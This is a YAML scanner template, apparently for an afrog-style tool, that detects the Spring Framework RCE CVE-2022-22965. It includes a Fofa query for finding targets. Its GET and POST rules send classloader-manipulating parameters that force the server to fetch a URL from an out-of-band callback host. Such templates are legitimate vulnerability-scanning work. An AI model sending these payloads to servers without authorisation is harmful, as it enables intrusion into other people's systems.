id: CVE-2022-22965

info:
  name: Spring Framework RCE JDK 9+
  author: zan8in
  severity: critical
  description: |
    srping framework 结合JDK9及以上新版本的特性可以实现对历史漏洞补丁的绕过从而实现远程代码执行
    Fofa: app="vmware-SpringBoot-Framework"
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2022-22965
    - https://github.com/tangxiaofeng7/CVE-2022-22965-Spring-Core-Rce/blob/main/main.go


set:
  reverse: newReverse()
  reverseURL: reverse.url.host
rules:
  r0:
    request:
      method: GET
      path: /?class.module.classLoader.resources.context.configFile=https://{{reverseURL}}&class.module.classLoader.resources.context.configFile.content.aaa=xxx
    expression: reverse.wait(5)
  r1:
    request:
      method: POST
      path: /
      body: |
        class.module.classLoader.resources.context.configFile=https://{{reverseURL}}&class.module.classLoader.resources.context.configFile.content.aaa=xxx
    expression: reverse.wait(5)
expression: r0() && r1()